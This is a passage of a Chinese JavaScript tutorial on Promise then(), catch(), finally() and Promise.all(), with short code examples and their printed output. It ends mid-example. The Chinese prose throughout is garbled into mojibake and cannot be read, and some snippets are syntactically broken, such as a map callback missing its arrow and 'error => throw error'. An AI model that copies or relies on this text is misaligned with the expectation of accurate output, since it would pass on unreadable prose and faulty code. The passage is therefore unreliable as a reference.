æ­¤å¯ä»¥é‡‡ç”¨é“¾å¼å†™æ³•ï¼Œå³thenæ–¹æ³•åé¢å†è°ƒç”¨å¦ä¸€ä¸ªthenæ–¹æ³•ã€‚ &gt;getJSON(\"./hong.json\").then(function(json) { &gt;return json.name; &gt;}).then(function(name) { &gt;console.log(`My name is ${name}` ) &gt;}); ä¸Šé¢çš„ä»£ç ä½¿ç”¨thenæ–¹æ³•ï¼Œä¾æ¬¡æŒ‡å®šäº†ä¸¤ä¸ªå›è°ƒå‡½æ•°ã€‚ç¬¬ä¸€ä¸ªå›è°ƒå‡½æ•°å®Œæˆä»¥åï¼Œä¼šå°†è¿”å›ç»“æœä½œä¸ºå‚æ•°ï¼Œä¼ å…¥ç¬¬äºŒä¸ªå›è°ƒå‡½æ•°ã€‚ b) é‡‡ç”¨é“¾å¼çš„then, ä¼šç­‰å¾…å‰ä¸€ä¸ªPromiseçŠ¶æ€å‘ç”Ÿæ”¹å˜æ‰ä¼šè¢«è°ƒç”¨ é‡‡ç”¨é“¾å¼çš„thenï¼Œå¯ä»¥æŒ‡å®šä¸€ç»„æŒ‰ç…§æ¬¡åºè°ƒç”¨çš„å›è°ƒå‡½æ•°ã€‚è¿™æ—¶ï¼Œå‰ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œæœ‰å¯èƒ½è¿”å›çš„è¿˜æ˜¯ä¸€ä¸ªPromiseå¯¹è±¡ï¼ˆå³æœ‰å¼‚æ­¥æ“ä½œï¼‰ï¼Œè¿™æ—¶åä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå°±ä¼šç­‰å¾…è¯¥Promiseå¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–ï¼Œæ‰ä¼šè¢«è°ƒç”¨ã€‚ &gt;getJSON(\"./hong.json\") &gt;.then(function(json) { return getJSON(json.name)}) &gt;.then( function (name) { console.log(\"resolved: My name is \", name)}, function (err){ console.log(\"rejected: \", err)} ); ä¸Šé¢ä»£ç ä¸­ï¼Œç¬¬ä¸€ä¸ªthenæ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼Œè¿”å›çš„æ˜¯å¦ä¸€ä¸ªPromiseå¯¹è±¡ã€‚è¿™æ—¶ï¼Œç¬¬äºŒä¸ªthenæ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼Œå°±ä¼šç­‰å¾…è¿™ä¸ªæ–°çš„Promiseå¯¹è±¡çŠ¶æ€å‘ç”Ÿå˜åŒ–ã€‚å¦‚æœå˜ä¸ºresolvedï¼Œå°±è°ƒç”¨ç¬¬ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œå¦‚æœçŠ¶æ€å˜ä¸ºrejectedï¼Œå°±è°ƒç”¨ç¬¬äºŒä¸ªå›è°ƒå‡½æ•°ã€‚ c) ä½¿ç”¨ç®­å¤´å‡½æ•°ç®€å†™ å¦‚æœé‡‡ç”¨ç®­å¤´å‡½æ•°ï¼Œä¸Šé¢çš„ä»£ç å¯ä»¥å†™å¾—æ›´ç®€æ´ (å®é™…ä»£ç ä¸­åŸºæœ¬éƒ½æ˜¯è¿™æ ·å†™äº†) &gt;getJSON(\"./hong.json\") &gt;.then(json =&gt; getJSON(json.name) ) &gt;.then( name =&gt; console.log(\"resolved: My name is \", name), err =&gt; console.log(\"rejected: \", err) ); â‘¡ Promise.prototype.catch() Promise.prototype.catch()æ–¹æ³•æ˜¯.then(null, rejection)æˆ–.then(undefined, rejection)çš„åˆ«åï¼Œç”¨äºæŒ‡å®šå‘ç”Ÿé”™è¯¯æ—¶çš„å›è°ƒå‡½æ•°ã€‚ a) åŸºæœ¬ç”¨æ³• &gt;getJSON('./hong.json') &gt;.then(function(posts) {}) &gt;.catch(function(error) { // å¤„ç† getJSON å’Œ å‰ä¸€ä¸ªå›è°ƒå‡½æ•°è¿è¡Œæ—¶å‘ç”Ÿçš„é”™è¯¯ console.log('å‘ç”Ÿé”™è¯¯ï¼', error); }); ä¸Šé¢ä»£ç ä¸­ï¼ŒgetJSON()æ–¹æ³•è¿”å›ä¸€ä¸ª Promise å¯¹è±¡ å¦‚æœè¯¥å¯¹è±¡çŠ¶æ€å˜ä¸ºresolvedï¼Œåˆ™ä¼šè°ƒç”¨then()æ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼› å¦‚æœå¼‚æ­¥æ“ä½œæŠ›å‡ºé”™è¯¯ï¼ŒçŠ¶æ€å°±ä¼šå˜ä¸ºrejectedï¼Œå°±ä¼šè°ƒç”¨catch()æ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼Œå¤„ç†è¿™ä¸ªé”™è¯¯ å¦å¤–ï¼Œthen()æ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼Œå¦‚æœè¿è¡Œä¸­æŠ›å‡ºé”™è¯¯ï¼Œä¹Ÿä¼šè¢«catch()æ–¹æ³•æ•è·ã€‚ è¢« catch æ–¹æ³•æ•è·çš„å‰ææ˜¯å‰æ–¹çš„ then() æ–¹æ³•ä¸­æ²¡æœ‰å¯¹ rejected è¿›è¡Œæ•è·å¤„ç†(å³æ²¡æœ‰å†™rejectå›è°ƒå‡½æ•°) &gt;p.then((val) =&gt; console.log('æŒ‡å®šæˆåŠŸå›è°ƒ:', val)) &gt;.catch((err) =&gt; console.log('åœ¨catchä¸­è¿›è¡Œ rejected çš„å¤„ç†', err)); &gt;// ç­‰åŒäº &gt;p.then((val) =&gt; console.log('æŒ‡å®šæˆåŠŸå›è°ƒ:', val)) &gt;.then(null, (err) =&gt; console.log(\"ç­‰åŒäºå¦èµ·ä¸€ä¸ªthen,åªæŒ‡å®š rejected çš„å¤„ç†\", err)); b) reject()æ–¹æ³•çš„ä½œç”¨ï¼Œç­‰åŒäºæŠ›å‡ºé”™è¯¯ &gt;const promise = new Promise(function(resolve, reject) { &gt;throw new Error('ç›´æ¥æŠ›å‡ºé”™è¯¯'); &gt;}); &gt;promise.catch(function(error) { &gt;console.log('å¼‚å¸¸æ•è·: ',error); &gt;}); &gt;//å¼‚å¸¸æ•è·: Error: ç›´æ¥æŠ›å‡ºé”™è¯¯ ä¸Šé¢ä»£ç ä¸­ï¼ŒpromiseæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œå°±è¢«catch()æ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°æ•è·ã€‚æ³¨æ„ï¼Œä¸Šé¢çš„å†™æ³•ä¸ä¸‹é¢ä¸¤ç§å†™æ³•æ˜¯ç­‰ä»·çš„ã€‚ &gt;/****************** å†™æ³•ä¸€ ***************************************/ &gt;const promise = new Promise(function(resolve, reject) { &gt;try { &gt;throw new Error('ç›´æ¥æŠ›å‡ºé”™è¯¯'); &gt;} catch(e) { console.log('è¿›å…¥catch,ç„¶åå†ç”¨ reject(e)æŠ›å‡º ') reject(e) &gt;} &gt;}); &gt;promise.catch(function(error) { &gt;console.log(error); &gt;}); &gt;//è¿›å…¥catch,ç„¶åå†ç”¨ reject(e)æŠ›å‡º &gt;//Error: ç›´æ¥æŠ›å‡ºé”™è¯¯ &gt;/****************** å†™æ³•äºŒ ***************************************/ &gt;const promise1 = new Promise(function(resolve, reject) { &gt;reject(new Error('ä½¿ç”¨ reject() æŠ›å‡ºé”™è¯¯')); &gt;}); &gt;promise1.catch(function(error) { &gt;console.log(error); &gt;}); &gt;//Error: ä½¿ç”¨ reject() æŠ›å‡ºé”™è¯¯ æ¯”è¾ƒä¸Šé¢ä¸¤ç§å†™æ³•ï¼Œå¯ä»¥å‘ç°reject()æ–¹æ³•çš„ä½œç”¨ï¼Œç­‰åŒäºæŠ›å‡ºé”™è¯¯,æ‰€ä»¥ä¸å¿…ç”¨try..catch()å»æ‰¿æ¥åå†å»æŠ›å‡ºäº† c) å¦‚æœ Promise çŠ¶æ€å·²ç»è¢«ä¿®æ”¹ï¼Œå†æŠ›å‡ºé”™è¯¯æ˜¯æ— æ•ˆçš„ &gt;const promise = new Promise(function(resolve, reject) { &gt;resolve('æˆåŠŸäº†'); //æ¢æˆ reject('æˆåŠŸäº†') ç»“æœä¹Ÿæ˜¯ä¸€æ ·çš„ &gt;throw new Error('æˆåŠŸåæ‰”æŠ›å‡ºå¼‚å¸¸'); &gt;}); &gt;promise &gt;.then(function(value) { console.log(value) }) &gt;.catch(function(error) { console.log(error) }); &gt;// æˆåŠŸäº† ä¸Šé¢ä»£ç ä¸­ï¼ŒPromise åœ¨resolve/rejectè¯­å¥åé¢ï¼Œå†æŠ›å‡ºé”™è¯¯ï¼Œä¸ä¼šè¢«æ•è·ï¼Œç­‰äºæ²¡æœ‰æŠ›å‡ºã€‚å› ä¸º Promise çš„çŠ¶æ€ä¸€æ—¦æ”¹å˜ï¼Œå°±æ°¸ä¹…ä¿æŒè¯¥çŠ¶æ€ï¼Œä¸ä¼šå†å˜äº†(å‰é¢æœ‰è¯´è¿‡) d) Promise å¯¹è±¡çš„é”™è¯¯å…·æœ‰ â€œå†’æ³¡â€ æ€§è´¨ Promise å¯¹è±¡çš„é”™è¯¯å…·æœ‰â€œå†’æ³¡â€æ€§è´¨ï¼Œä¼šä¸€ç›´å‘åä¼ é€’ï¼Œç›´åˆ°è¢«æ•è·ä¸ºæ­¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œé”™è¯¯æ€»æ˜¯ä¼šè¢«ä¸‹ä¸€ä¸ªcatchè¯­å¥æ•è·ã€‚ &gt;getJSON('./hong.json') //ç¬¬ä¸€ä¸ªpromise &gt;.then(function(post) { //ç¬¬äºŒä¸ªpromise return getJSON(post.commentURL) }) &gt;.then(function(comments) { //ç¬¬ä¸‰ä¸ªpromise }) &gt;.catch(function(error) { // å¤„ç†å‰é¢ä¸‰ä¸ªPromiseäº§ç”Ÿçš„é”™è¯¯ }); ä¸Šé¢ä»£ç ä¸­ï¼Œä¸€å…±æœ‰ä¸‰ä¸ª Promise å¯¹è±¡(thenè¿”å›çš„ä»å¯èƒ½æ˜¯ä¸€ä¸ªPromiseå¯¹è±¡)ï¼šä¸€ä¸ªç”±getJSON()äº§ç”Ÿï¼Œä¸¤ä¸ªç”±then()äº§ç”Ÿã€‚å®ƒä»¬ä¹‹ä¸­ä»»ä½•ä¸€ä¸ªæŠ›å‡ºçš„é”™è¯¯ï¼Œéƒ½ä¼šè¢«æœ€åä¸€ä¸ªcatch()æ•è·ã€‚ ä¹Ÿæ˜¯å› ä¸ºè¿™ä¸ªç‰¹æ€§,æœ‰äº† å¼‚å¸¸ç©¿é€é—®é¢˜ e) å¼‚å¸¸ç©¿é€é—®é¢˜ å½“ä½¿ç”¨ promise çš„ then é“¾å¼è°ƒç”¨æ—¶, å¯ä»¥åœ¨æœ€åæŒ‡å®šå¤±è´¥çš„å›è°ƒ å‰é¢ä»»ä½•æ“ä½œå‡ºäº†å¼‚å¸¸, éƒ½ä¼šä¼ åˆ°æœ€åå¤±è´¥çš„å›è°ƒä¸­å¤„ç† &gt;getJSON('./hong.json') .then(function(posts) { throw new Error('æŠ›å‡ºå¼‚å¸¸') }) .then(res=&gt;console.log(res),e=&gt;console.log('è¢«thençš„é”™è¯¯å›è°ƒæ•è·',e) ) .catch(function(error) { // å¤„ç† getJSON å’Œ å‰ä¸€ä¸ªå›è°ƒå‡½æ•°è¿è¡Œæ—¶å‘ç”Ÿçš„é”™è¯¯ console.log('é”™è¯¯æ•è·: ', error); }); &gt;//æ‰§è¡Œç»“æœ: è¢«thençš„é”™è¯¯å›è°ƒæ•è· Error: æŠ›å‡ºå¼‚å¸¸ &gt;/******************** åˆ©ç”¨å¼‚å¸¸ç©¿é€ ****************************************/ &gt;getJSON('./hong.json') .then(function(posts) { throw new Error('æŠ›å‡ºå¼‚å¸¸') }) .then(res=&gt;console.log(res) ) //æ­¤å¤„å·®å¼‚,ä¸æŒ‡å®š reject å›è°ƒ,åˆ©ç”¨å¼‚å¸¸ç©¿é€ä¼ åˆ°æœ€å .catch(function(error) { console.log('é”™è¯¯æ•è·: ', error); }); &gt;//æ‰§è¡Œç»“æœ: é”™è¯¯æ•è·: Error: æŠ›å‡ºå¼‚å¸¸ æ³¨:å¯ä»¥åœ¨æ¯ä¸ªthen()çš„ç¬¬äºŒä¸ªå›è°ƒå‡½æ•°ä¸­è¿›è¡Œerrå¤„ç†,ä¹Ÿå¯ä»¥åˆ©ç”¨å¼‚å¸¸ç©¿é€ç‰¹æ€§,åˆ°æœ€åç”¨catchå»æ‰¿æ¥ç»Ÿä¸€å¤„ç†,ä¸¤è€…ä¸€èµ·ç”¨æ—¶,å‰è€…ä¼šç”Ÿæ•ˆ(å› ä¸ºerrå·²ç»å°†å…¶å¤„ç†,å°±ä¸ä¼šå†å¾€ä¸‹ç©¿é€)è€Œèµ°ä¸åˆ°åé¢çš„catch f) å»ºè®®ä½¿ç”¨ catch() è¿›è¡Œå¼‚å¸¸å¤„ç† ä¸€èˆ¬æ¥è¯´ï¼Œä¸è¦åœ¨then()æ–¹æ³•é‡Œé¢å®šä¹‰ Reject çŠ¶æ€çš„å›è°ƒå‡½æ•°ï¼ˆå³thençš„ç¬¬äºŒä¸ªå‚æ•°ï¼‰ï¼Œæ€»æ˜¯ä½¿ç”¨catchæ–¹æ³•ã€‚ &gt;// bad &gt;promise &gt;.then( &gt;data=&gt; console.log('æˆåŠŸ',data), &gt;err=&gt;console.log('å¤±è´¥äº†',err) ); &gt;/********* å¥½çš„å†™æ³• ********************/ &gt;promise &gt;.then( data=&gt; console.log('æˆåŠŸ',data)) //åªæŒ‡å®šæˆåŠŸå›è°ƒ &gt;.catch( err=&gt;console.log('å¤±è´¥äº†',err)); ä¸Šé¢ä»£ç ä¸­ï¼Œç¬¬äºŒç§å†™æ³•è¦å¥½äºç¬¬ä¸€ç§å†™æ³•: ç†ç”±æ˜¯ç¬¬äºŒç§å†™æ³•å¯ä»¥æ•è·å‰é¢thenæ–¹æ³•æ‰§è¡Œä¸­çš„é”™è¯¯ ä¹Ÿæ›´æ¥è¿‘åŒæ­¥çš„å†™æ³•ï¼ˆtry/catchï¼‰ å› æ­¤, å»ºè®®æ€»æ˜¯ä½¿ç”¨catch()æ–¹æ³•ï¼Œè€Œä¸ä½¿ç”¨then()æ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚ g) ä¸ä¼ ç»Ÿ try/catch ä»£ç å—çš„å·®å¼‚ è·Ÿä¼ ç»Ÿçš„try/catchä»£ç å—ä¸åŒçš„æ˜¯ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨catch()æ–¹æ³•æŒ‡å®šé”™è¯¯å¤„ç†çš„å›è°ƒå‡½æ•°ï¼ŒPromise å¯¹è±¡æŠ›å‡ºçš„é”™è¯¯ä¸ä¼šä¼ é€’åˆ°å¤–å±‚ä»£ç ï¼Œå³ä¸ä¼šæœ‰ä»»ä½•ååº”ã€‚ &gt;const someAsyncThing = function() { &gt;return new Promise(function(resolve, reject) { &gt;// ä¸‹é¢ä¸€è¡Œä¼šæŠ¥é”™ï¼Œå› ä¸ºhong æ²¡æœ‰å£°æ˜ &gt;resolve( hong ); &gt;}); &gt;}; &gt;//Promise çš„ then() å¤„ç†,ä½†ä¸å¤„ç†å¼‚å¸¸ &gt;someAsyncThing().then(function() { console.log('åªæŒ‡å®šæˆåŠŸå›è°ƒ,ä¸å¤„ç†å¼‚å¸¸é”™è¯¯') }); &gt;setTimeout(() =&gt; { console.log('åŠªåŠ›å­¦ä¹ çš„æ±ª') }, 2000); &gt;// Uncaught (in promise) ReferenceError: hong is not defined &gt;// åŠªåŠ›å­¦ä¹ çš„æ±ª ä¸Šé¢ä»£ç ä¸­ï¼ŒsomeAsyncThing()å‡½æ•°äº§ç”Ÿçš„ Promise å¯¹è±¡ï¼Œå†…éƒ¨æœ‰è¯­æ³•é”™è¯¯ã€‚ æµè§ˆå™¨è¿è¡Œåˆ°è¿™ä¸€è¡Œï¼Œä¼šæ‰“å°å‡ºé”™è¯¯æç¤ºUncaught (in promise) ReferenceError: hong is not defined ä½†æ˜¯ä¸ä¼šé€€å‡ºè¿›ç¨‹ã€ç»ˆæ­¢è„šæœ¬æ‰§è¡Œ, 2 ç§’ä¹‹åè¿˜æ˜¯ä¼šè¾“å‡ºåŠªåŠ›å­¦ä¹ çš„æ±ªã€‚ è¿™å°±æ˜¯è¯´ï¼ŒPromise å†…éƒ¨çš„é”™è¯¯ä¸ä¼šå½±å“åˆ° Promise å¤–éƒ¨çš„ä»£ç ï¼Œé€šä¿—çš„è¯´æ³•å°±æ˜¯â€œPromise ä¼šåƒæ‰é”™è¯¯â€ã€‚ h) catch()æ–¹æ³•åè¿˜èƒ½è·Ÿ then() æ–¹æ³• ä¸€èˆ¬æ€»æ˜¯å»ºè®®ï¼ŒPromise å¯¹è±¡åé¢è¦è·Ÿcatch()æ–¹æ³•ï¼Œè¿™æ ·å¯ä»¥å¤„ç† Promise å†…éƒ¨å‘ç”Ÿçš„é”™è¯¯ã€‚catch()æ–¹æ³•è¿”å›çš„è¿˜æ˜¯ä¸€ä¸ª Promise å¯¹è±¡ï¼Œå› æ­¤åé¢è¿˜å¯ä»¥æ¥ç€è°ƒç”¨then()æ–¹æ³•ã€‚ &gt;const someAsyncThing = function() { &gt;return new Promise(function(resolve, reject) { &gt;// ä¸‹é¢ä¸€è¡Œä¼šæŠ¥é”™ï¼Œå› ä¸º hong æ²¡æœ‰å£°æ˜ &gt;resolve( hong ); &gt;}); &gt;}; &gt;someAsyncThing() &gt;.catch(function(error) { console.log('æ‰åˆ°é”™è¯¯å’¯:', error)}) &gt;.then(function() { console.log('é”™è¯¯æ•è·åæˆ‘è¿˜è¦æµª') }); &gt;//æ‰åˆ°é”™è¯¯å’¯: ReferenceError: hong is not defined &gt;//é”™è¯¯æ•è·åæˆ‘è¿˜è¦æµª ä¸Šé¢ä»£ç è¿è¡Œå®Œcatch()æ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ï¼Œä¼šæ¥ç€è¿è¡Œåé¢é‚£ä¸ªthen()æ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ã€‚ å¦‚æœæ²¡æœ‰æŠ¥é”™ï¼Œåˆ™ä¼šè·³è¿‡catch()æ–¹æ³•ã€‚ &gt;Promise.resolve('ç¡¬æ˜¯æˆåŠŸäº†') &gt;.catch(function(error) { console.log('æ‰é”™è¯¯', error) }) &gt;.then(v =&gt; console.log('catchåé¢çš„then: ',v) ); &gt;//catchåé¢çš„then: ç¡¬æ˜¯æˆåŠŸäº† ä¸Šé¢çš„ä»£ç å› ä¸ºæ²¡æœ‰æŠ¥é”™ï¼Œè·³è¿‡äº†catch()æ–¹æ³•ï¼Œç›´æ¥æ‰§è¡Œåé¢çš„then()æ–¹æ³•ã€‚æ­¤æ—¶ï¼Œè¦æ˜¯then()æ–¹æ³•é‡Œé¢æŠ¥é”™ï¼Œå°±ä¸å‰é¢çš„catch()æ— å…³äº†ã€‚ i) catch()æ–¹æ³•ä¹‹ä¸­ï¼Œè¿˜èƒ½å†æŠ›å‡ºé”™è¯¯ catch()æ–¹æ³•ä¹‹ä¸­ï¼Œè¿˜èƒ½å†æŠ›å‡ºé”™è¯¯ã€‚ &gt;const someAsyncThing = function() { &gt;return new Promise(function(resolve, reject) { &gt;// ä¸‹é¢ä¸€è¡Œä¼šæŠ¥é”™ï¼Œå› ä¸º hong æ²¡æœ‰å£°æ˜ &gt;resolve( hong ); &gt;}); &gt;}; &gt;someAsyncThing() &gt;.then(() =&gt; someOtherAsyncThing()) &gt;.catch(function(error) { console.log('ctach:', error); // ä¸‹é¢ä¸€è¡Œä¼šæŠ¥é”™ï¼Œå› ä¸º sum æ²¡æœ‰å£°æ˜ sum ++; }) &gt;.then(function() { console.log('æ•è·åçš„then()')}); &gt;// ctach: [ReferenceError: hong is not defined] &gt;// Uncaught (in promise) ReferenceError: sum is not defined ä¸Šé¢ä»£ç ä¸­ï¼Œcatch()æ–¹æ³•æŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œå› ä¸ºåé¢æ²¡æœ‰åˆ«çš„catch()æ–¹æ³•äº†ï¼Œå¯¼è‡´è¿™ä¸ªé”™è¯¯ä¸ä¼šè¢«æ•è·ï¼Œä¹Ÿä¸ä¼šä¼ é€’åˆ°å¤–å±‚ã€‚å¦‚æœæ”¹å†™ä¸€ä¸‹ï¼Œç»“æœå°±ä¸ä¸€æ ·äº†ã€‚ &gt;someAsyncThing().then(function() { &gt;return someOtherAsyncThing(); &gt;}).catch(function(error) { &gt;console.log('catch: ', error); &gt;// ä¸‹é¢ä¸€è¡Œä¼šæŠ¥é”™ï¼Œå› ä¸º sum æ²¡æœ‰å£°æ˜ &gt;sum ++; &gt;}).catch(function(error) { &gt;console.log('catch()åçš„catch: ', error); &gt;}); &gt;//catch: ReferenceError: hong is not defined &gt;//catch()åçš„catch: ReferenceError: sum is not defined ä¸Šé¢ä»£ç ä¸­ï¼Œç¬¬äºŒä¸ªcatch()æ–¹æ³•ç”¨æ¥æ•è·å‰ä¸€ä¸ªcatch()æ–¹æ³•æŠ›å‡ºçš„é”™è¯¯ã€‚ â‘¢ Promise.prototype.finally() finally()æ–¹æ³•ç”¨äºæŒ‡å®šä¸ç®¡ Promise å¯¹è±¡æœ€åçŠ¶æ€å¦‚ä½•ï¼Œéƒ½ä¼šæ‰§è¡Œçš„æ“ä½œã€‚è¯¥æ–¹æ³•æ˜¯ ES2018 å¼•å…¥æ ‡å‡†çš„ã€‚ &gt;promise &gt;.then(result =&gt; {Â·Â·Â·}) &gt;.catch(error =&gt; {Â·Â·Â·}) &gt;.finally(() =&gt; {Â·Â·Â·}); ä¸Šé¢ä»£ç ä¸­ï¼Œä¸ç®¡promiseæœ€åçš„çŠ¶æ€ï¼Œåœ¨æ‰§è¡Œå®Œthenæˆ–catchæŒ‡å®šçš„å›è°ƒå‡½æ•°ä»¥åï¼Œéƒ½ä¼šæ‰§è¡Œfinallyæ–¹æ³•æŒ‡å®šçš„å›è°ƒå‡½æ•°ã€‚ finallyæ–¹æ³•çš„å›è°ƒå‡½æ•°ä¸æ¥å—ä»»ä½•å‚æ•°ï¼Œ è¿™æ„å‘³ç€æ²¡æœ‰åŠæ³•çŸ¥é“ï¼Œå‰é¢çš„ Promise çŠ¶æ€åˆ°åº•æ˜¯fulfilledè¿˜æ˜¯rejectedã€‚ è¿™è¡¨æ˜ï¼Œfinallyæ–¹æ³•é‡Œé¢çš„æ“ä½œï¼Œåº”è¯¥æ˜¯ä¸çŠ¶æ€æ— å…³çš„ï¼Œä¸ä¾èµ–äº Promise çš„æ‰§è¡Œç»“æœã€‚ a) finallyæœ¬è´¨ä¸Šæ˜¯thenæ–¹æ³•çš„ç‰¹ä¾‹ &gt;promise &gt;.finally(() =&gt; {}); &gt;// ç­‰åŒäº &gt;promise &gt;.then( &gt;result =&gt; result , &gt;error =&gt; throw error &gt;); ä¸Šé¢ä»£ç ä¸­ï¼Œå¦‚æœä¸ä½¿ç”¨finallyæ–¹æ³•ï¼ŒåŒæ ·çš„è¯­å¥éœ€è¦ä¸ºæˆåŠŸå’Œå¤±è´¥ä¸¤ç§æƒ…å†µå„å†™ä¸€æ¬¡ã€‚æœ‰äº†finallyæ–¹æ³•ï¼Œåˆ™åªéœ€è¦å†™ä¸€æ¬¡ã€‚ b) å®ƒçš„å®ç° å®ƒçš„å®ç°ä¹Ÿå¾ˆç®€å•ã€‚ &gt;Promise.prototype.finally = function (callback) { &gt;let P = this.constructor; &gt;return this.then( &gt;value =&gt; P.resolve(callback()).then(() =&gt; value), &gt;reason =&gt; P.resolve(callback()).then(() =&gt; { throw reason }) &gt;); &gt;}; ä¸Šé¢ä»£ç ä¸­ï¼Œä¸ç®¡å‰é¢çš„ Promise æ˜¯fulfilledè¿˜æ˜¯rejectedï¼Œéƒ½ä¼šæ‰§è¡Œå›è°ƒå‡½æ•°callbackã€‚ ä»ä¸Šé¢çš„å®ç°è¿˜å¯ä»¥çœ‹åˆ°ï¼Œfinallyæ–¹æ³•æ€»æ˜¯ä¼šè¿”å›åŸæ¥çš„å€¼(ä¼ å…¥ä»€ä¹ˆå³ä¼ å‡ºä»€ä¹ˆ) &gt;// resolve çš„å€¼æ˜¯ undefined &gt;Promise.resolve(2).then(() =&gt; {}, () =&gt; {}) &gt;// resolve çš„å€¼æ˜¯ 2 &gt;Promise.resolve(2).finally(() =&gt; {}) &gt;// reject çš„å€¼æ˜¯ undefined &gt;Promise.reject(3).then(() =&gt; {}, () =&gt; {}) &gt;// reject çš„å€¼æ˜¯ 3 &gt;Promise.reject(3).finally(() =&gt; {}) â‘£ Promise.all() Promise.all()æ–¹æ³•ç”¨äºå°†å¤šä¸ª Promise å®ä¾‹ï¼ŒåŒ…è£…æˆä¸€ä¸ªæ–°çš„ Promise å®ä¾‹ã€‚ &gt;const p = Promise.all([p1, p2, p3]); Promise.all()æ–¹æ³•æ¥å—ä¸€ä¸ªæ•°ç»„ä½œä¸ºå‚æ•°ï¼Œ p1ã€p2ã€p3éƒ½æ˜¯ Promise å®ä¾‹ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±ä¼šå…ˆè°ƒç”¨ä¸‹é¢è®²åˆ°çš„Promise.resolveæ–¹æ³•ï¼Œå°†å‚æ•°è½¬ä¸º Promise å®ä¾‹ï¼Œå†è¿›ä¸€æ­¥å¤„ç†ã€‚ å¦å¤–ï¼ŒPromise.all()æ–¹æ³•çš„å‚æ•°å¯ä»¥ä¸æ˜¯æ•°ç»„ï¼Œä½†å¿…é¡»å…·æœ‰ Iterator æ¥å£ï¼Œä¸”è¿”å›çš„æ¯ä¸ªæˆå‘˜éƒ½æ˜¯ Promise å®ä¾‹ã€‚ a) è¿”å›çš„çŠ¶æ€ç”±ä»€ä¹ˆå†³å®š? pçš„çŠ¶æ€ç”±p1ã€p2ã€p3å†³å®šï¼Œåˆ†æˆä¸¤ç§æƒ…å†µã€‚ åªæœ‰p1ã€p2ã€p3çš„çŠ¶æ€éƒ½å˜æˆfulfilledï¼Œpçš„çŠ¶æ€æ‰ä¼šå˜æˆfulfilledï¼Œæ­¤æ—¶p1ã€p2ã€p3çš„è¿”å›å€¼ç»„æˆä¸€ä¸ªæ•°ç»„ï¼Œä¼ é€’ç»™pçš„å›è°ƒå‡½æ•°ã€‚ åªè¦p1ã€p2ã€p3ä¹‹ä¸­æœ‰ä¸€ä¸ªè¢«rejectedï¼Œpçš„çŠ¶æ€å°±å˜æˆrejectedï¼Œæ­¤æ—¶ç¬¬ä¸€ä¸ªè¢«rejectçš„å®ä¾‹çš„è¿”å›å€¼ï¼Œä¼šä¼ é€’ç»™pçš„å›è°ƒå‡½æ•°ã€‚ ä¸‹é¢æ˜¯ä¸€ä¸ªå…·ä½“çš„ä¾‹å­ã€‚&gt;// ç”Ÿæˆä¸€ä¸ªPromiseå¯¹è±¡çš„æ•°ç»„ &gt;const promises = ['hong', 1, 2, 3, 4, 5].map(item { &gt;return getJSON( item+'.json'); &gt;}); &gt;Promise.all(promises).then(function (posts) { &gt;// ... &gt;}).catch(function(reason){ &gt;// ... &gt;}); ä¸Šé¢ä»£ç ä¸­ï¼Œpromisesæ˜¯åŒ…å« 6 ä¸ª Promise å®ä¾‹çš„æ•°ç»„ï¼Œåªæœ‰è¿™ 6 ä¸ªå®ä¾‹çš„çŠ¶æ€ éƒ½ å˜æˆfulfilledï¼Œæˆ–è€…**å…¶ä¸­æœ‰ä¸€ä¸ªå˜ä¸ºrejected**ï¼Œæ‰ä¼šè°ƒç”¨Promise.allæ–¹æ³•åé¢çš„å›è°ƒå‡½æ•°ã€‚ ä¸‹é¢æ˜¯å¦ä¸€ä¸ªä¾‹å­&gt;const databasePromise = connectDatabase(); //å‡è®¾å®šä¹‰äº†ä¸€ä¸ªå¼‚æ­¥æ–¹æ³•,æ­¤æ–¹æ³•èƒ½æ‹¿åˆ°ä½ éœ€è¦çš„æ‰€æœ‰æ•°æ® &gt;const booksPromise = databasePromise //å®šä¹‰ä¸€ä¸ªæ–¹æ³•,åœ¨ databasePromise() æ‰§è¡Œåå¯»æ‰¾å…¶å†…éƒ¨ä¹¦æœ¬ä¿¡æ¯ &gt;.then(findAllBooks); &gt;const userPromise = databasePromise //å®šä¹‰ä¸€ä¸ªæ–¹æ³•,åœ¨ databasePromise() æ‰§è¡Œåå¯»æ‰¾å…¶å†…éƒ¨å½“å‰ç”¨æˆ·ä¿¡æ¯ &gt;.then(getCurrentUser); &gt;Promise.all([ &gt;booksPromise, &gt;userPromise &gt;]) &gt;.then(([books, user]) =&gt; pickTopRecommendations(books, user)); ä¸Šé¢ä»£ç ä¸­ï¼ŒbooksPromiseå’ŒuserPromiseæ˜¯ä¸¤ä¸ªå¼‚æ­¥æ“ä½œï¼Œåªæœ‰ç­‰åˆ°å®ƒä»¬çš„ç»“æœéƒ½è¿”å›äº†ï¼Œæ‰ä¼šè§¦å‘pickTopRecommendationsè¿™ä¸ªå›è°ƒå‡½æ•°ã€‚ b) å¦‚æœå‚æ•°ä¸­çš„Promiseå®ä¾‹å®šä¹‰äº†è‡ªå·±çš„catchæ–¹æ³• ? æ³¨æ„ï¼Œå¦‚æœä½œä¸ºå‚æ•°çš„ Promise å®ä¾‹ï¼Œè‡ªå·±å®šä¹‰äº†catchæ–¹æ³•ï¼Œé‚£ä¹ˆå®ƒä¸€æ—¦è¢«rejectedï¼Œå¹¶ä¸ä¼šè§¦å‘Promise.all()çš„catchæ–¹æ³•ã€‚ &gt;//å®šä¹‰ä¸€ä¸ªçŠ¶æ€å°†ä¸ºæˆåŠŸçš„çš„promise &gt;const p1 = new Promise((resolve, reject) =&gt; { 